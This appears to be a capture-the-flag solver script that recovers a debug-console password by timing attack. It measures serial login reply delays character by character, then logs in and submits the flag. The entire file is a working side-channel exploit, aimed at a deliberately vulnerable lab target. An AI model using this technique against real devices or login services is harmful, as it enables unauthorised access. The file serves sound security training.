#!/usr/bin/env python3
"""SER-03 Debug login: timing attack on `login <pw>`.

The check compares the password character by character and pauses after each
correct one, so the response to a guess comes back later the longer its correct
prefix is. Recover the 8-char [a-z0-9] password one position at a time by
picking the candidate with the slowest reply, then log in and submit the flag.

usage: ser03_login.py [port]   (default /dev/ttyACM0)
"""
import sys
import time

from _util import FLAG_RE, PROMPT, open_console, port_arg, submit, sync

ALPHABET = "abcdefghijklmnopqrstuvwxyz0123456789"
PW_LEN = 8


def timed_login(s, guess):
    """Returns (seconds from Enter to the reply, reply text)."""
    s.reset_input_buffer()
    s.write(("login " + guess).encode())
    s.flush()
    time.sleep(0.02)  # let the echo of the typed text drain
    s.reset_input_buffer()
    t0 = time.monotonic()
    s.write(b"\r")
    s.flush()
    buf = b""
    t_reply = None
    end = t0 + 3.0
    while time.monotonic() < end:
        chunk = s.read(max(1, s.in_waiting))  # return as soon as bytes arrive
        if chunk:
            buf += chunk
            if t_reply is None and b"Access" in buf:
                t_reply = time.monotonic()
            if t_reply is not None and PROMPT in buf[buf.index(b"Access"):]:
                break
    if t_reply is None:
        raise RuntimeError("no reply to login: %r" % buf)
    return t_reply - t0, buf.decode(errors="replace")


def main():
    s = open_console(port_arg())
    sync(s)
    start = time.monotonic()
    known = ""
    for pos in range(PW_LEN):
        pad = "_" * (PW_LEN - pos - 1)  # '_' is never in the alphabet
        times = {c: [] for c in ALPHABET}
        found = None
        for _ in range(5):  # sample rounds until one candidate clearly stands out
            for c in ALPHABET:
                dt, text = timed_login(s, known + c + pad)
                if "granted" in text:
                    found = c
                    break
                times[c].append(dt)
            if found:
                break
            ranked = sorted(ALPHABET, key=lambda c: min(times[c]), reverse=True)
            best, second = min(times[ranked[0]]), min(times[ranked[1]])
            if best - second > 0.012:  # one extra 30 ms step (allowing tick rounding)
                found = ranked[0]
                break
        if not found:
            print("could not separate candidates at position", pos,
                  [(c, round(min(times[c]) * 1000, 1)) for c in ranked[:4]])
            return 1
        known += found
        print("pos %d: %s  (%.1f s)" % (pos, known, time.monotonic() - start))

    dt, text = timed_login(s, known)
    m = FLAG_RE.search(text)
    if not m:
        print("login failed:", text)
        return 1
    print("password %s recovered in %.1f s" % (known, time.monotonic() - start))
    print("flag", m.group(0))
    sync(s)
    return submit(s, m.group(0))


if __name__ == "__main__":
    sys.exit(main())
